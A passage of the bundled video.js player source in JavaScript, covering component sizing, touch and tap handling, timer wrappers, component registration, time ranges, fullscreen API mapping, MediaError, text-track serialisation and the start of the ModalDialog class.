         * @type {EventTarget~Event}
         */
        this.trigger('componentresize');
      }

      return;
    }

    // Not setting a value, so getting it
    // Make sure element exists
    if (!this.el_) {
      return 0;
    }

    // Get dimension value from style
    var val = this.el_.style[widthOrHeight];
    var pxIndex = val.indexOf('px');

    if (pxIndex !== -1) {
      // Return the pixel value with no 'px'
      return parseInt(val.slice(0, pxIndex), 10);
    }

    // No px so using % or no style was set, so falling back to offsetWidth/height
    // If component has display:none, offset will return 0
    // TODO: handle display:none and no dimension style using px
    return parseInt(this.el_['offset' + toTitleCase(widthOrHeight)], 10);
  };

  /**
   * Get the width or the height of the `Component` elements computed style. Uses
   * `window.getComputedStyle`.
   *
   * @param {string} widthOrHeight
   *        A string containing 'width' or 'height'. Whichever one you want to get.
   *
   * @return {number}
   *         The dimension that gets asked for or 0 if nothing was set
   *         for that dimension.
   */


  Component.prototype.currentDimension = function currentDimension(widthOrHeight) {
    var computedWidthOrHeight = 0;

    if (widthOrHeight !== 'width' && widthOrHeight !== 'height') {
      throw new Error('currentDimension only accepts width or height value');
    }

    if (typeof window_1.getComputedStyle === 'function') {
      var computedStyle = window_1.getComputedStyle(this.el_);

      computedWidthOrHeight = computedStyle.getPropertyValue(widthOrHeight) || computedStyle[widthOrHeight];
    }

    // remove 'px' from variable and parse as integer
    computedWidthOrHeight = parseFloat(computedWidthOrHeight);

    // if the computed value is still 0, it's possible that the browser is lying
    // and we want to check the offset values.
    // This code also runs on IE8 and wherever getComputedStyle doesn't exist.
    if (computedWidthOrHeight === 0) {
      var rule = 'offset' + toTitleCase(widthOrHeight);

      computedWidthOrHeight = this.el_[rule];
    }

    return computedWidthOrHeight;
  };

  /**
   * An object that contains width and height values of the `Component`s
   * computed style. Uses `window.getComputedStyle`.
   *
   * @typedef {Object} Component~DimensionObject
   *
   * @property {number} width
   *           The width of the `Component`s computed style.
   *
   * @property {number} height
   *           The height of the `Component`s computed style.
   */

  /**
   * Get an object that contains width and height values of the `Component`s
   * computed style.
   *
   * @return {Component~DimensionObject}
   *         The dimensions of the components element
   */


  Component.prototype.currentDimensions = function currentDimensions() {
    return {
      width: this.currentDimension('width'),
      height: this.currentDimension('height')
    };
  };

  /**
   * Get the width of the `Component`s computed style. Uses `window.getComputedStyle`.
   *
   * @return {number} width
   *           The width of the `Component`s computed style.
   */


  Component.prototype.currentWidth = function currentWidth() {
    return this.currentDimension('width');
  };

  /**
   * Get the height of the `Component`s computed style. Uses `window.getComputedStyle`.
   *
   * @return {number} height
   *           The height of the `Component`s computed style.
   */


  Component.prototype.currentHeight = function currentHeight() {
    return this.currentDimension('height');
  };

  /**
   * Set the focus to this component
   */


  Component.prototype.focus = function focus() {
    this.el_.focus();
  };

  /**
   * Remove the focus from this component
   */


  Component.prototype.blur = function blur() {
    this.el_.blur();
  };

  /**
   * Emit a 'tap' events when touch event support gets detected. This gets used to
   * support toggling the controls through a tap on the video. They get enabled
   * because every sub-component would have extra overhead otherwise.
   *
   * @private
   * @fires Component#tap
   * @listens Component#touchstart
   * @listens Component#touchmove
   * @listens Component#touchleave
   * @listens Component#touchcancel
   * @listens Component#touchend
    */


  Component.prototype.emitTapEvents = function emitTapEvents() {
    // Track the start time so we can determine how long the touch lasted
    var touchStart = 0;
    var firstTouch = null;

    // Maximum movement allowed during a touch event to still be considered a tap
    // Other popular libs use anywhere from 2 (hammer.js) to 15,
    // so 10 seems like a nice, round number.
    var tapMovementThreshold = 10;

    // The maximum length a touch can be while still being considered a tap
    var touchTimeThreshold = 200;

    var couldBeTap = void 0;

    this.on('touchstart', function (event) {
      // If more than one finger, don't consider treating this as a click
      if (event.touches.length === 1) {
        // Copy pageX/pageY from the object
        firstTouch = {
          pageX: event.touches[0].pageX,
          pageY: event.touches[0].pageY
        };
        // Record start time so we can detect a tap vs. "touch and hold"
        touchStart = new Date().getTime();
        // Reset couldBeTap tracking
        couldBeTap = true;
      }
    });

    this.on('touchmove', function (event) {
      // If more than one finger, don't consider treating this as a click
      if (event.touches.length > 1) {
        couldBeTap = false;
      } else if (firstTouch) {
        // Some devices will throw touchmoves for all but the slightest of taps.
        // So, if we moved only a small distance, this could still be a tap
        var xdiff = event.touches[0].pageX - firstTouch.pageX;
        var ydiff = event.touches[0].pageY - firstTouch.pageY;
        var touchDistance = Math.sqrt(xdiff * xdiff + ydiff * ydiff);

        if (touchDistance > tapMovementThreshold) {
          couldBeTap = false;
        }
      }
    });

    var noTap = function noTap() {
      couldBeTap = false;
    };

    // TODO: Listen to the original target. http://youtu.be/DujfpXOKUp8?t=13m8s
    this.on('touchleave', noTap);
    this.on('touchcancel', noTap);

    // When the touch ends, measure how long it took and trigger the appropriate
    // event
    this.on('touchend', function (event) {
      firstTouch = null;
      // Proceed only if the touchmove/leave/cancel event didn't happen
      if (couldBeTap === true) {
        // Measure how long the touch lasted
        var touchTime = new Date().getTime() - touchStart;

        // Make sure the touch was less than the threshold to be considered a tap
        if (touchTime < touchTimeThreshold) {
          // Don't let browser turn this into a click
          event.preventDefault();
          /**
           * Triggered when a `Component` is tapped.
           *
           * @event Component#tap
           * @type {EventTarget~Event}
           */
          this.trigger('tap');
          // It may be good to copy the touchend event object and change the
          // type to tap, if the other event properties aren't exact after
          // Events.fixEvent runs (e.g. event.target)
        }
      }
    });
  };

  /**
   * This function reports user activity whenever touch events happen. This can get
   * turned off by any sub-components that wants touch events to act another way.
   *
   * Report user touch activity when touch events occur. User activity gets used to
   * determine when controls should show/hide. It is simple when it comes to mouse
   * events, because any mouse event should show the controls. So we capture mouse
   * events that bubble up to the player and report activity when that happens.
   * With touch events it isn't as easy as `touchstart` and `touchend` toggle player
   * controls. So touch events can't help us at the player level either.
   *
   * User activity gets checked asynchronously. So what could happen is a tap event
   * on the video turns the controls off. Then the `touchend` event bubbles up to
   * the player. Which, if it reported user activity, would turn the controls right
   * back on. We also don't want to completely block touch events from bubbling up.
   * Furthermore a `touchmove` event and anything other than a tap, should not turn
   * controls back on.
   *
   * @listens Component#touchstart
   * @listens Component#touchmove
   * @listens Component#touchend
   * @listens Component#touchcancel
   */


  Component.prototype.enableTouchActivity = function enableTouchActivity() {
    // Don't continue if the root player doesn't support reporting user activity
    if (!this.player() || !this.player().reportUserActivity) {
      return;
    }

    // listener for reporting that the user is active
    var report = bind(this.player(), this.player().reportUserActivity);

    var touchHolding = void 0;

    this.on('touchstart', function () {
      report();
      // For as long as the they are touching the device or have their mouse down,
      // we consider them active even if they're not moving their finger or mouse.
      // So we want to continue to update that they are active
      this.clearInterval(touchHolding);
      // report at the same interval as activityCheck
      touchHolding = this.setInterval(report, 250);
    });

    var touchEnd = function touchEnd(event) {
      report();
      // stop the interval that maintains activity if the touch is holding
      this.clearInterval(touchHolding);
    };

    this.on('touchmove', report);
    this.on('touchend', touchEnd);
    this.on('touchcancel', touchEnd);
  };

  /**
   * A callback that has no parameters and is bound into `Component`s context.
   *
   * @callback Component~GenericCallback
   * @this Component
   */

  /**
   * Creates a function that runs after an `x` millisecond timeout. This function is a
   * wrapper around `window.setTimeout`. There are a few reasons to use this one
   * instead though:
   * 1. It gets cleared via  {@link Component#clearTimeout} when
   *    {@link Component#dispose} gets called.
   * 2. The function callback will gets turned into a {@link Component~GenericCallback}
   *
   * > Note: You can't use `window.clearTimeout` on the id returned by this function. This
   *         will cause its dispose listener not to get cleaned up! Please use
   *         {@link Component#clearTimeout} or {@link Component#dispose} instead.
   *
   * @param {Component~GenericCallback} fn
   *        The function that will be run after `timeout`.
   *
   * @param {number} timeout
   *        Timeout in milliseconds to delay before executing the specified function.
   *
   * @return {number}
   *         Returns a timeout ID that gets used to identify the timeout. It can also
   *         get used in {@link Component#clearTimeout} to clear the timeout that
   *         was set.
   *
   * @listens Component#dispose
   * @see [Similar to]{@link https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/setTimeout}
   */


  Component.prototype.setTimeout = function setTimeout(fn, timeout) {
    var _this2 = this;

    fn = bind(this, fn);

    var timeoutId = window_1.setTimeout(fn, timeout);
    var disposeFn = function disposeFn() {
      return _this2.clearTimeout(timeoutId);
    };

    disposeFn.guid = 'vjs-timeout-' + timeoutId;

    this.on('dispose', disposeFn);

    return timeoutId;
  };

  /**
   * Clears a timeout that gets created via `window.setTimeout` or
   * {@link Component#setTimeout}. If you set a timeout via {@link Component#setTimeout}
   * use this function instead of `window.clearTimout`. If you don't your dispose
   * listener will not get cleaned up until {@link Component#dispose}!
   *
   * @param {number} timeoutId
   *        The id of the timeout to clear. The return value of
   *        {@link Component#setTimeout} or `window.setTimeout`.
   *
   * @return {number}
   *         Returns the timeout id that was cleared.
   *
   * @see [Similar to]{@link https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/clearTimeout}
   */


  Component.prototype.clearTimeout = function clearTimeout(timeoutId) {
    window_1.clearTimeout(timeoutId);

    var disposeFn = function disposeFn() {};

    disposeFn.guid = 'vjs-timeout-' + timeoutId;

    this.off('dispose', disposeFn);

    return timeoutId;
  };

  /**
   * Creates a function that gets run every `x` milliseconds. This function is a wrapper
   * around `window.setInterval`. There are a few reasons to use this one instead though.
   * 1. It gets cleared via  {@link Component#clearInterval} when
   *    {@link Component#dispose} gets called.
   * 2. The function callback will be a {@link Component~GenericCallback}
   *
   * @param {Component~GenericCallback} fn
   *        The function to run every `x` seconds.
   *
   * @param {number} interval
   *        Execute the specified function every `x` milliseconds.
   *
   * @return {number}
   *         Returns an id that can be used to identify the interval. It can also be be used in
   *         {@link Component#clearInterval} to clear the interval.
   *
   * @listens Component#dispose
   * @see [Similar to]{@link https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/setInterval}
   */


  Component.prototype.setInterval = function setInterval(fn, interval) {
    var _this3 = this;

    fn = bind(this, fn);

    var intervalId = window_1.setInterval(fn, interval);

    var disposeFn = function disposeFn() {
      return _this3.clearInterval(intervalId);
    };

    disposeFn.guid = 'vjs-interval-' + intervalId;

    this.on('dispose', disposeFn);

    return intervalId;
  };

  /**
   * Clears an interval that gets created via `window.setInterval` or
   * {@link Component#setInterval}. If you set an inteval via {@link Component#setInterval}
   * use this function instead of `window.clearInterval`. If you don't your dispose
   * listener will not get cleaned up until {@link Component#dispose}!
   *
   * @param {number} intervalId
   *        The id of the interval to clear. The return value of
   *        {@link Component#setInterval} or `window.setInterval`.
   *
   * @return {number}
   *         Returns the interval id that was cleared.
   *
   * @see [Similar to]{@link https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/clearInterval}
   */


  Component.prototype.clearInterval = function clearInterval(intervalId) {
    window_1.clearInterval(intervalId);

    var disposeFn = function disposeFn() {};

    disposeFn.guid = 'vjs-interval-' + intervalId;

    this.off('dispose', disposeFn);

    return intervalId;
  };

  /**
   * Queues up a callback to be passed to requestAnimationFrame (rAF), but
   * with a few extra bonuses:
   *
   * - Supports browsers that do not support rAF by falling back to
   *   {@link Component#setTimeout}.
   *
   * - The callback is turned into a {@link Component~GenericCallback} (i.e.
   *   bound to the component).
   *
   * - Automatic cancellation of the rAF callback is handled if the component
   *   is disposed before it is called.
   *
   * @param  {Component~GenericCallback} fn
   *         A function that will be bound to this component and executed just
   *         before the browser's next repaint.
   *
   * @return {number}
   *         Returns an rAF ID that gets used to identify the timeout. It can
   *         also be used in {@link Component#cancelAnimationFrame} to cancel
   *         the animation frame callback.
   *
   * @listens Component#dispose
   * @see [Similar to]{@link https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame}
   */


  Component.prototype.requestAnimationFrame = function requestAnimationFrame(fn) {
    var _this4 = this;

    if (this.supportsRaf_) {
      fn = bind(this, fn);

      var id = window_1.requestAnimationFrame(fn);
      var disposeFn = function disposeFn() {
        return _this4.cancelAnimationFrame(id);
      };

      disposeFn.guid = 'vjs-raf-' + id;
      this.on('dispose', disposeFn);

      return id;
    }

    // Fall back to using a timer.
    return this.setTimeout(fn, 1000 / 60);
  };

  /**
   * Cancels a queued callback passed to {@link Component#requestAnimationFrame}
   * (rAF).
   *
   * If you queue an rAF callback via {@link Component#requestAnimationFrame},
   * use this function instead of `window.cancelAnimationFrame`. If you don't,
   * your dispose listener will not get cleaned up until {@link Component#dispose}!
   *
   * @param {number} id
   *        The rAF ID to clear. The return value of {@link Component#requestAnimationFrame}.
   *
   * @return {number}
   *         Returns the rAF ID that was cleared.
   *
   * @see [Similar to]{@link https://developer.mozilla.org/en-US/docs/Web/API/window/cancelAnimationFrame}
   */


  Component.prototype.cancelAnimationFrame = function cancelAnimationFrame(id) {
    if (this.supportsRaf_) {
      window_1.cancelAnimationFrame(id);

      var disposeFn = function disposeFn() {};

      disposeFn.guid = 'vjs-raf-' + id;

      this.off('dispose', disposeFn);

      return id;
    }

    // Fall back to using a timer.
    return this.clearTimeout(id);
  };

  /**
   * Register a `Component` with `videojs` given the name and the component.
   *
   * > NOTE: {@link Tech}s should not be registered as a `Component`. {@link Tech}s
   *         should be registered using {@link Tech.registerTech} or
   *         {@link videojs:videojs.registerTech}.
   *
   * > NOTE: This function can also be seen on videojs as
   *         {@link videojs:videojs.registerComponent}.
   *
   * @param {string} name
   *        The name of the `Component` to register.
   *
   * @param {Component} ComponentToRegister
   *        The `Component` class to register.
   *
   * @return {Component}
   *         The `Component` that was registered.
   */


  Component.registerComponent = function registerComponent(name, ComponentToRegister) {
    if (typeof name !== 'string' || !name) {
      throw new Error('Illegal component name, "' + name + '"; must be a non-empty string.');
    }

    var Tech = Component.getComponent('Tech');

    // We need to make sure this check is only done if Tech has been registered.
    var isTech = Tech && Tech.isTech(ComponentToRegister);
    var isComp = Component === ComponentToRegister || Component.prototype.isPrototypeOf(ComponentToRegister.prototype);

    if (isTech || !isComp) {
      var reason = void 0;

      if (isTech) {
        reason = 'techs must be registered using Tech.registerTech()';
      } else {
        reason = 'must be a Component subclass';
      }

      throw new Error('Illegal component, "' + name + '"; ' + reason + '.');
    }

    name = toTitleCase(name);

    if (!Component.components_) {
      Component.components_ = {};
    }

    var Player = Component.getComponent('Player');

    if (name === 'Player' && Player && Player.players) {
      var players = Player.players;
      var playerNames = Object.keys(players);

      // If we have players that were disposed, then their name will still be
      // in Players.players. So, we must loop through and verify that the value
      // for each item is not null. This allows registration of the Player component
      // after all players have been disposed or before any were created.
      if (players && playerNames.length > 0 && playerNames.map(function (pname) {
        return players[pname];
      }).every(Boolean)) {
        throw new Error('Can not register Player component after player has been created.');
      }
    }

    Component.components_[name] = ComponentToRegister;

    return ComponentToRegister;
  };

  /**
   * Get a `Component` based on the name it was registered with.
   *
   * @param {string} name
   *        The Name of the component to get.
   *
   * @return {Component}
   *         The `Component` that got registered under the given name.
   *
   * @deprecated In `videojs` 6 this will not return `Component`s that were not
   *             registered using {@link Component.registerComponent}. Currently we
   *             check the global `videojs` object for a `Component` name and
   *             return that if it exists.
   */


  Component.getComponent = function getComponent(name) {
    if (!name) {
      return;
    }

    name = toTitleCase(name);

    if (Component.components_ && Component.components_[name]) {
      return Component.components_[name];
    }
  };

  return Component;
}();

/**
 * Whether or not this component supports `requestAnimationFrame`.
 *
 * This is exposed primarily for testing purposes.
 *
 * @private
 * @type {Boolean}
 */


Component.prototype.supportsRaf_ = typeof window_1.requestAnimationFrame === 'function' && typeof window_1.cancelAnimationFrame === 'function';

Component.registerComponent('Component', Component);

/**
 * @file time-ranges.js
 * @module time-ranges
 */

/**
 * Returns the time for the specified index at the start or end
 * of a TimeRange object.
 *
 * @function time-ranges:indexFunction
 *
 * @param {number} [index=0]
 *        The range number to return the time for.
 *
 * @return {number}
 *         The time that offset at the specified index.
 *
 * @depricated index must be set to a value, in the future this will throw an error.
 */

/**
 * An object that contains ranges of time for various reasons.
 *
 * @typedef {Object} TimeRange
 *
 * @property {number} length
 *           The number of time ranges represented by this Object
 *
 * @property {time-ranges:indexFunction} start
 *           Returns the time offset at which a specified time range begins.
 *
 * @property {time-ranges:indexFunction} end
 *           Returns the time offset at which a specified time range ends.
 *
 * @see https://developer.mozilla.org/en-US/docs/Web/API/TimeRanges
 */

/**
 * Check if any of the time ranges are over the maximum index.
 *
 * @param {string} fnName
 *        The function name to use for logging
 *
 * @param {number} index
 *        The index to check
 *
 * @param {number} maxIndex
 *        The maximum possible index
 *
 * @throws {Error} if the timeRanges provided are over the maxIndex
 */
function rangeCheck(fnName, index, maxIndex) {
  if (typeof index !== 'number' || index < 0 || index > maxIndex) {
    throw new Error('Failed to execute \'' + fnName + '\' on \'TimeRanges\': The index provided (' + index + ') is non-numeric or out of bounds (0-' + maxIndex + ').');
  }
}

/**
 * Get the time for the specified index at the start or end
 * of a TimeRange object.
 *
 * @param {string} fnName
 *        The function name to use for logging
 *
 * @param {string} valueIndex
 *        The proprety that should be used to get the time. should be 'start' or 'end'
 *
 * @param {Array} ranges
 *        An array of time ranges
 *
 * @param {Array} [rangeIndex=0]
 *        The index to start the search at
 *
 * @return {number}
 *         The time that offset at the specified index.
 *
 *
 * @depricated rangeIndex must be set to a value, in the future this will throw an error.
 * @throws {Error} if rangeIndex is more than the length of ranges
 */
function getRange(fnName, valueIndex, ranges, rangeIndex) {
  rangeCheck(fnName, rangeIndex, ranges.length - 1);
  return ranges[rangeIndex][valueIndex];
}

/**
 * Create a time range object given ranges of time.
 *
 * @param {Array} [ranges]
 *        An array of time ranges.
 */
function createTimeRangesObj(ranges) {
  if (ranges === undefined || ranges.length === 0) {
    return {
      length: 0,
      start: function start() {
        throw new Error('This TimeRanges object is empty');
      },
      end: function end() {
        throw new Error('This TimeRanges object is empty');
      }
    };
  }
  return {
    length: ranges.length,
    start: getRange.bind(null, 'start', 0, ranges),
    end: getRange.bind(null, 'end', 1, ranges)
  };
}

/**
 * Should create a fake `TimeRange` object which mimics an HTML5 time range instance.
 *
 * @param {number|Array} start
 *        The start of a single range or an array of ranges
 *
 * @param {number} end
 *        The end of a single range.
 *
 * @private
 */
function createTimeRanges(start, end) {
  if (Array.isArray(start)) {
    return createTimeRangesObj(start);
  } else if (start === undefined || end === undefined) {
    return createTimeRangesObj();
  }
  return createTimeRangesObj([[start, end]]);
}

/**
 * @file buffer.js
 * @module buffer
 */
/**
 * Compute the percentage of the media that has been buffered.
 *
 * @param {TimeRange} buffered
 *        The current `TimeRange` object representing buffered time ranges
 *
 * @param {number} duration
 *        Total duration of the media
 *
 * @return {number}
 *         Percent buffered of the total duration in decimal form.
 */
function bufferedPercent(buffered, duration) {
  var bufferedDuration = 0;
  var start = void 0;
  var end = void 0;

  if (!duration) {
    return 0;
  }

  if (!buffered || !buffered.length) {
    buffered = createTimeRanges(0, 0);
  }

  for (var i = 0; i < buffered.length; i++) {
    start = buffered.start(i);
    end = buffered.end(i);

    // buffered end can be bigger than duration by a very small fraction
    if (end > duration) {
      end = duration;
    }

    bufferedDuration += end - start;
  }

  return bufferedDuration / duration;
}

/**
 * @file fullscreen-api.js
 * @module fullscreen-api
 * @private
 */
/**
 * Store the browser-specific methods for the fullscreen API.
 *
 * @type {Object}
 * @see [Specification]{@link https://fullscreen.spec.whatwg.org}
 * @see [Map Approach From Screenfull.js]{@link https://github.com/sindresorhus/screenfull.js}
 */
var FullscreenApi = {};

// browser API methods
var apiMap = [['requestFullscreen', 'exitFullscreen', 'fullscreenElement', 'fullscreenEnabled', 'fullscreenchange', 'fullscreenerror'],
// WebKit
['webkitRequestFullscreen', 'webkitExitFullscreen', 'webkitFullscreenElement', 'webkitFullscreenEnabled', 'webkitfullscreenchange', 'webkitfullscreenerror'],
// Old WebKit (Safari 5.1)
['webkitRequestFullScreen', 'webkitCancelFullScreen', 'webkitCurrentFullScreenElement', 'webkitCancelFullScreen', 'webkitfullscreenchange', 'webkitfullscreenerror'],
// Mozilla
['mozRequestFullScreen', 'mozCancelFullScreen', 'mozFullScreenElement', 'mozFullScreenEnabled', 'mozfullscreenchange', 'mozfullscreenerror'],
// Microsoft
['msRequestFullscreen', 'msExitFullscreen', 'msFullscreenElement', 'msFullscreenEnabled', 'MSFullscreenChange', 'MSFullscreenError']];

var specApi = apiMap[0];
var browserApi = void 0;

// determine the supported set of functions
for (var i = 0; i < apiMap.length; i++) {
  // check for exitFullscreen function
  if (apiMap[i][1] in document_1) {
    browserApi = apiMap[i];
    break;
  }
}

// map the browser API names to the spec API names
if (browserApi) {
  for (var _i = 0; _i < browserApi.length; _i++) {
    FullscreenApi[specApi[_i]] = browserApi[_i];
  }
}

/**
 * @file media-error.js
 */
/**
 * A Custom `MediaError` class which mimics the standard HTML5 `MediaError` class.
 *
 * @param {number|string|Object|MediaError} value
 *        This can be of multiple types:
 *        - number: should be a standard error code
 *        - string: an error message (the code will be 0)
 *        - Object: arbitrary properties
 *        - `MediaError` (native): used to populate a video.js `MediaError` object
 *        - `MediaError` (video.js): will return itself if it's already a
 *          video.js `MediaError` object.
 *
 * @see [MediaError Spec]{@link https://dev.w3.org/html5/spec-author-view/video.html#mediaerror}
 * @see [Encrypted MediaError Spec]{@link https://www.w3.org/TR/2013/WD-encrypted-media-20130510/#error-codes}
 *
 * @class MediaError
 */
function MediaError(value) {

  // Allow redundant calls to this constructor to avoid having `instanceof`
  // checks peppered around the code.
  if (value instanceof MediaError) {
    return value;
  }

  if (typeof value === 'number') {
    this.code = value;
  } else if (typeof value === 'string') {
    // default code is zero, so this is a custom error
    this.message = value;
  } else if (isObject(value)) {

    // We assign the `code` property manually because native `MediaError` objects
    // do not expose it as an own/enumerable property of the object.
    if (typeof value.code === 'number') {
      this.code = value.code;
    }

    assign(this, value);
  }

  if (!this.message) {
    this.message = MediaError.defaultMessages[this.code] || '';
  }
}

/**
 * The error code that refers two one of the defined `MediaError` types
 *
 * @type {Number}
 */
MediaError.prototype.code = 0;

/**
 * An optional message that to show with the error. Message is not part of the HTML5
 * video spec but allows for more informative custom errors.
 *
 * @type {String}
 */
MediaError.prototype.message = '';

/**
 * An optional status code that can be set by plugins to allow even more detail about
 * the error. For example a plugin might provide a specific HTTP status code and an
 * error message for that code. Then when the plugin gets that error this class will
 * know how to display an error message for it. This allows a custom message to show
 * up on the `Player` error overlay.
 *
 * @type {Array}
 */
MediaError.prototype.status = null;

/**
 * Errors indexed by the W3C standard. The order **CANNOT CHANGE**! See the
 * specification listed under {@link MediaError} for more information.
 *
 * @enum {array}
 * @readonly
 * @property {string} 0 - MEDIA_ERR_CUSTOM
 * @property {string} 1 - MEDIA_ERR_CUSTOM
 * @property {string} 2 - MEDIA_ERR_ABORTED
 * @property {string} 3 - MEDIA_ERR_NETWORK
 * @property {string} 4 - MEDIA_ERR_SRC_NOT_SUPPORTED
 * @property {string} 5 - MEDIA_ERR_ENCRYPTED
 */
MediaError.errorTypes = ['MEDIA_ERR_CUSTOM', 'MEDIA_ERR_ABORTED', 'MEDIA_ERR_NETWORK', 'MEDIA_ERR_DECODE', 'MEDIA_ERR_SRC_NOT_SUPPORTED', 'MEDIA_ERR_ENCRYPTED'];

/**
 * The default `MediaError` messages based on the {@link MediaError.errorTypes}.
 *
 * @type {Array}
 * @constant
 */
MediaError.defaultMessages = {
  1: 'You aborted the media playback',
  2: 'A network error caused the media download to fail part-way.',
  3: 'The media playback was aborted due to a corruption problem or because the media used features your browser did not support.',
  4: 'The media could not be loaded, either because the server or network failed or because the format is not supported.',
  5: 'The media is encrypted and we do not have the keys to decrypt it.'
};

// Add types as properties on MediaError
// e.g. MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED = 4;
for (var errNum = 0; errNum < MediaError.errorTypes.length; errNum++) {
  MediaError[MediaError.errorTypes[errNum]] = errNum;
  // values should be accessible on both the class and instance
  MediaError.prototype[MediaError.errorTypes[errNum]] = errNum;
}

var tuple = SafeParseTuple;

function SafeParseTuple(obj, reviver) {
    var json;
    var error = null;

    try {
        json = JSON.parse(obj, reviver);
    } catch (err) {
        error = err;
    }

    return [error, json]
}

/**
 * Returns whether an object is `Promise`-like (i.e. has a `then` method).
 *
 * @param  {Object}  value
 *         An object that may or may not be `Promise`-like.
 *
 * @return {Boolean}
 *         Whether or not the object is `Promise`-like.
 */
function isPromise(value) {
  return value !== undefined && value !== null && typeof value.then === 'function';
}

/**
 * Silence a Promise-like object.
 *
 * This is useful for avoiding non-harmful, but potentially confusing "uncaught
 * play promise" rejection error messages.
 *
 * @param  {Object} value
 *         An object that may or may not be `Promise`-like.
 */
function silencePromise(value) {
  if (isPromise(value)) {
    value.then(null, function (e) {});
  }
}

/**
 * @file text-track-list-converter.js Utilities for capturing text track state and
 * re-creating tracks based on a capture.
 *
 * @module text-track-list-converter
 */

/**
 * Examine a single {@link TextTrack} and return a JSON-compatible javascript object that
 * represents the {@link TextTrack}'s state.
 *
 * @param {TextTrack} track
 *        The text track to query.
 *
 * @return {Object}
 *         A serializable javascript representation of the TextTrack.
 * @private
 */
var trackToJson_ = function trackToJson_(track) {
  var ret = ['kind', 'label', 'language', 'id', 'inBandMetadataTrackDispatchType', 'mode', 'src'].reduce(function (acc, prop, i) {

    if (track[prop]) {
      acc[prop] = track[prop];
    }

    return acc;
  }, {
    cues: track.cues && Array.prototype.map.call(track.cues, function (cue) {
      return {
        startTime: cue.startTime,
        endTime: cue.endTime,
        text: cue.text,
        id: cue.id
      };
    })
  });

  return ret;
};

/**
 * Examine a {@link Tech} and return a JSON-compatible javascript array that represents the
 * state of all {@link TextTrack}s currently configured. The return array is compatible with
 * {@link text-track-list-converter:jsonToTextTracks}.
 *
 * @param {Tech} tech
 *        The tech object to query
 *
 * @return {Array}
 *         A serializable javascript representation of the {@link Tech}s
 *         {@link TextTrackList}.
 */
var textTracksToJson = function textTracksToJson(tech) {

  var trackEls = tech.$$('track');

  var trackObjs = Array.prototype.map.call(trackEls, function (t) {
    return t.track;
  });
  var tracks = Array.prototype.map.call(trackEls, function (trackEl) {
    var json = trackToJson_(trackEl.track);

    if (trackEl.src) {
      json.src = trackEl.src;
    }
    return json;
  });

  return tracks.concat(Array.prototype.filter.call(tech.textTracks(), function (track) {
    return trackObjs.indexOf(track) === -1;
  }).map(trackToJson_));
};

/**
 * Create a set of remote {@link TextTrack}s on a {@link Tech} based on an array of javascript
 * object {@link TextTrack} representations.
 *
 * @param {Array} json
 *        An array of `TextTrack` representation objects, like those that would be
 *        produced by `textTracksToJson`.
 *
 * @param {Tech} tech
 *        The `Tech` to create the `TextTrack`s on.
 */
var jsonToTextTracks = function jsonToTextTracks(json, tech) {
  json.forEach(function (track) {
    var addedTrack = tech.addRemoteTextTrack(track).track;

    if (!track.src && track.cues) {
      track.cues.forEach(function (cue) {
        return addedTrack.addCue(cue);
      });
    }
  });

  return tech.textTracks();
};

var textTrackConverter = { textTracksToJson: textTracksToJson, jsonToTextTracks: jsonToTextTracks, trackToJson_: trackToJson_ };

/**
 * @file modal-dialog.js
 */
var MODAL_CLASS_NAME = 'vjs-modal-dialog';
var ESC = 27;

/**
 * The `ModalDialog` displays over the video and its controls, which blocks
 * interaction with the player until it is closed.
 *
 * Modal dialogs include a "Close" button and will close when that button
 * is activated - or when ESC is pressed anywhere.
 *
 * @extends Component
 */

var ModalDialog = function (_Component) {
  inherits(ModalDialog, _Component);

  /**
   * Create an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Mixed} [options.content=undefined]
   *        Provide customized content for this modal.
   *
   * @param {string} [options.description]
   *        A text description for the modal, primarily for accessibility.
   *
   * @param {boolean} [options.fillAlways=false]
   *        Normally, modals are automatically filled only the first time
   *        they open. This tells the modal to refresh its content
   *        every time it opens.
   *
   * @param {string} [options.label]
   *        A text label for the modal, primarily for accessibility.
   *
   * @param {boolean} [options.temporary=true]
   *        If `true`, the modal can only be opened once; it will be
   *        disposed as soon as it's closed.
   *
   * @param {boolean} [options.uncloseable=false]
   *        If `true`, the user will not be able to close the modal
   *        through the UI in the normal ways. Programmatic closing is
   *        still possible.
   */
  function ModalDialog(player, options) {
    classCallCheck(this, ModalDialog);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.opened_ = _this.hasBeenOpened_ = _this.hasBeenFilled_ = false;

    _this.closeable(!_this.options_.uncloseable);
    _this.content(_this.options_.content);

    // Make sure the contentEl is defined AFTER any children are initialized
    // because we only want the contents of the modal in the contentEl
    // (not the UI elements like the close button).
    _this.contentEl_ = createEl('div', {
      className: MODAL_CLASS_NAME + '-content'
    }, {
      role: 'document'
    });

    _this.descEl_ = createEl('p', {
      className: MODAL_CLASS_NAME + '-description vjs-control-text',
      id: _this.el().getAttribute('aria-describedby')
    });

    textContent(_this.descEl_, _this.description());
    _this.el_.appendChild(_this.descEl_);
    _this.el_.appendChild(_this.contentEl_);
    return _this;
  }

  /**
   * Create the `ModalDialog`'s DOM element
   *
   * @return {Element}
   *         The DOM element that gets created.
   */


  ModalDialog.prototype.createEl = function createEl$$1() {
    return _Component.prototype.createEl.call(this, 'div', {
      className: this.buildCSSClass(),
      tabIndex: -1
    }, {
      'aria-describedby': this.id() + '_description',
      'aria-hidden': 'true',
      'aria-label': this.label(),
      'role': 'dialog'
    });
  };

  ModalDialog.prototype.dispose = function dispose() {
    this.contentEl_ = null;
    this.descEl_ = null;
    this.previouslyActiveEl_ = null;

    _Component.prototype.dispose.call(this);
  };

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  ModalDialog.prototype.buildCSSClass = function buildCSSClass() {
    return MODAL_CLASS_NAME + ' vjs-hidden ' + _Component.prototype.buildCSSClass.call(this);
  };

  /**
   * Handles `keydown` events on the document, looking for ESC, which closes
   * the modal.
   *
   * @param {EventTarget~Event} e
   *        The keypress that triggered this event.
   *
   * @listens keydown
   */


  ModalDialog.prototype.handleKeyPress = function handleKeyPress(e) {
    if (e.which === ESC && this.closeable()) {
      this.close();
    }
  };

  /**
